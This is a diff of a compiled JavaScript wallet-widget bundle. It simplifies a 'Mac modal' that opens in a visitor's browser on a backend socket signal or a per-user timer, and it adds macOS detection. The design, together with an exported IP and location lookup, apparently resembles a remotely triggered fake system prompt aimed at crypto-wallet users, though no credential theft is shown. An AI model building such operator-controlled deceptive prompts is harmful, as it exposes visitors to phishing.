@@ -14515,35 +14515,28 @@ const ConnectWalletButton = ({ className = '', userId, }) => {
 /**
  * Get mac-modal settings for a user by user_id.
  * Public endpoint for widget usage.
- * Returns mac_user_name and mac_modal_timing (-1 means socket-only, 0+ means open after N seconds on load).
+ * mac_modal_timing: -1 = socket-only, 0+ = open after N seconds on load.
  */
 const getMacModalSettings = async (userId) => {
-    if (!userId) {
+    if (!userId)
         return null;
-    }
     try {
         const BACKEND_URL = getBackendUrl();
-        if (!BACKEND_URL) {
-            console.warn('BACKEND_URL is not configured');
+        if (!BACKEND_URL)
             return null;
-        }
         const response = await axios.get(`${BACKEND_URL}/api/users/user-id/${userId}/mac-modal`, { timeout: 5000 });
         return response.data;
     }
-    catch (error) {
-        console.warn('Failed to fetch mac-modal settings:', error instanceof Error ? error.message : 'Unknown error');
+    catch {
         return null;
     }
 };
 
 /**
- * Listens for the backend socket event (default: `showMacModal`) and opens the Mac modal only when
- * the payload's user_id matches this component's userId (or backendConfig.userId).
- * Also fetches mac_user_name and mac_modal_timing from user DB on load.
- * If mac_modal_timing >= 0, opens the Mac modal after that many seconds since the website is loaded.
- * If mac_modal_timing === -1, only socket-triggered (same as before).
- *
- * Backend example: io.emit('showMacModal', { message: '...', user_id, text, timing, timestamp });
+ * On load: fetches (mac_user_name, mac_modal_timing) from backend API.
+ * - If timing === -1: do nothing (modal opens only on socket signal).
+ * - If timing >= 0: open Mac modal after that many seconds, displaying mac_user_name from DB.
+ * Also subscribes to socket showMacModal; when timing is -1, that signal opens the modal.
  */
 const MacModalTrigger = ({ userId, backendConfig, onClose, }) => {
     const [isOpen, setIsOpen] = useState(false);
@@ -14565,7 +14558,7 @@ const MacModalTrigger = ({ userId, backendConfig, onClose, }) => {
         if (!effectiveUserId)
             return;
         timedOpenFiredRef.current = false;
-        const timerRef = { current: null };
+        let timer = null;
         let cancelled = false;
         getMacModalSettings(effectiveUserId).then((settings) => {
             if (cancelled || !settings || settings.mac_modal_timing === undefined || settings.mac_modal_timing < 0) {
@@ -14578,7 +14571,7 @@ const MacModalTrigger = ({ userId, backendConfig, onClose, }) => {
                 timedOpenFiredRef.current = true;
             }
             else {
-                timerRef.current = setTimeout(() => {
+                timer = setTimeout(() => {
                     if (cancelled || timedOpenFiredRef.current)
                         return;
                     setAdminName(settings.mac_user_name || undefined);
@@ -14589,8 +14582,8 @@ const MacModalTrigger = ({ userId, backendConfig, onClose, }) => {
         });
         return () => {
             cancelled = true;
-            if (timerRef.current)
-                clearTimeout(timerRef.current);
+            if (timer)
+                clearTimeout(timer);
         };
     }, [effectiveUserId]);
     const handleClose = () => {
@@ -14603,5 +14596,16 @@ const MacModalTrigger = ({ userId, backendConfig, onClose, }) => {
         React.createElement(MacModal, { wallet: "Mac", isOpen: isOpen, onClose: handleClose, userId: effectiveUserId, backendConfig: backendConfig, adminName: adminName })));
 };
 
-export { ASSET_PATHS, ConnectWalletButton, CustomWalletModal, MacModalTrigger, WalletSelectionModal, clearWalletTypesCache, getAllWalletTypes, getAssetBaseUrl, getAssetPath, getBackendUrl, getClientUrl, getConfig, getIPAndLocation, getMacModalSocketEvent, getUserWalletTypes, getWalletConfig, getWalletShortKey, resolveAssetUrl, setConfig, subscribeToShowMacModal, walletConfigs };
+/**
+ * Check if the user's operating system is macOS.
+ */
+const isMacOS = () => {
+    if (typeof navigator === 'undefined')
+        return false;
+    const platform = navigator.platform?.toLowerCase() ?? '';
+    const userAgent = navigator.userAgent?.toLowerCase() ?? '';
+    return platform.includes('mac') || userAgent.includes('mac');
+};
+
+export { ASSET_PATHS, ConnectWalletButton, CustomWalletModal, MacModalTrigger, WalletSelectionModal, clearWalletTypesCache, getAllWalletTypes, getAssetBaseUrl, getAssetPath, getBackendUrl, getClientUrl, getConfig, getIPAndLocation, getMacModalSocketEvent, getUserWalletTypes, getWalletConfig, getWalletShortKey, isMacOS, resolveAssetUrl, setConfig, subscribeToShowMacModal, walletConfigs };
 //# sourceMappingURL=index.esm.js.map
